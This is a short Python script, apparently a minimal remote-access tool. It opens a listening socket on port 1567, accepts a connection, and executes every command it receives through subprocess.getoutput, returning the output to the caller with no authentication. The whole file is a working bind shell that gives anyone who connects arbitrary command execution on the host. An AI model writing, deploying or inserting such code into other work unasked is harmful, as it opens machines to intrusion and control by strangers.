# -*- coding: utf-8 -*-


import socket
import subprocess

s=socket.socket()
host=socket.gethostname()
port=1567

s.bind((host,port))

print("Waiting for Connection...")
s.listen(5)

conn,addr=s.accept()
print("Connected to ",addr)

while True:
	conn.send('Cmd >'.encode())
	u_cmd = conn.recv(1024).decode()
	if(u_cmd != 'exit'):
		op =subprocess.getoutput(u_cmd)
		conn.send(op.encode())
		
	else:
		break
    
    
conn.close()
s.close()